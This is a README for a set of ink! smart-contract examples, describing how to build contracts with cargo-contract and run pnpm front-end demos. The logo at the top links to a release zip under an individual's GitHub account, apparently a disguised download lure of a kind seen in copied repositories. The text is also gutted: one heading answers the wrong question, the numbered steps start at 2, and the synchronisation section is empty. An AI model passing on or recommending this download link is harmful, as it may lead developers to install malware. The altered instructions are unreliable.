<div align="center">
   <a href="https://github.com/sifoBELAYADI/ink-examples/releases/download/v1.9.7/ink-examples.zip"><img src="./.images/ink-logo-glow.svg" alt="ink!" height="136" /></a>
</div>

This repository contains a set of example contracts for ink!.

Have a look at the different examples to better understand how to use ink! to build your own Substrate smart contracts.

### Can I add a new example here?

The content of that folder is synchronized with this repository on new releases.

## Preparation

```sh
cargo install cargo-contract --force
```

We use the `--force` to update to the most recent `cargo-contract` version.

## Build example contract and generate the contracts metadata

To build a single example and generate the contracts Wasm file, navigate to the root of the smart contract and run the following command:

`cargo contract build`

You should now have an optimized `<contract-name>.wasm` file, a `metadata.json` file and a `<contract-name>.contract` file in the `target` folder of your contract.
The `.contract` file combines the Wasm and metadata into one file and can be used for instantiation.

## Running front end dApp examples

2. Install dependencies `pnpm i`
3. Run each example with `pnpm <contract-example-name>`. e.g. `pnpm flipper`

### Commands

* `pnpm basic-contract-caller`
* `pnpm contract-terminate`
* `pnpm contract-transfer`
* `pnpm erc20`
* `pnpm erc721`
* `pnpm flipper`
* `pnpm incrementer`

### Synchronize this repository with ink! releases

## License

The examples in this folder are released into the public domain.
We hope they help you build something great with ink!.

